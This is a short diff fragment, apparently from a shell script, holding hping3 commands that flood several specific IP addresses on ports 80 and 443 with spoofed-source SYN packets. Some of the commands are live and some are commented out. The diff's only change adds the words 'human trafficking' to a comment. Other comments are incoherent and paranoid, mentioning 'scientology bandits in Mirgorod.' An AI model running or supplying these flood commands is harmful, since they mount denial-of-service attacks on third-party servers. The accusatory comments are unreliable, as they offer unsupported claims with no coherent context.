@@ -164,7 +164,7 @@
           sudo hping3 -a 190.0.175.123 95.173.136.70 -S -d 120 --flood -p 80 -1 &
           sudo hping3 -a 190.0.175.163 95.173.136.72 -S -d 120 --flood -p 80 -1 &
 
-          # possible, to all ports on server.
+          # possible, to all ports on server. human trafficking.
           # Yep, I win while scientology bandits in Mirgorod try to find way to my house. 
           # sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 443 -0 &
           # sudo hping3 -a 190.0.175.125 35.190.56.182 -S -d 120 --flood -p 443 -0 &
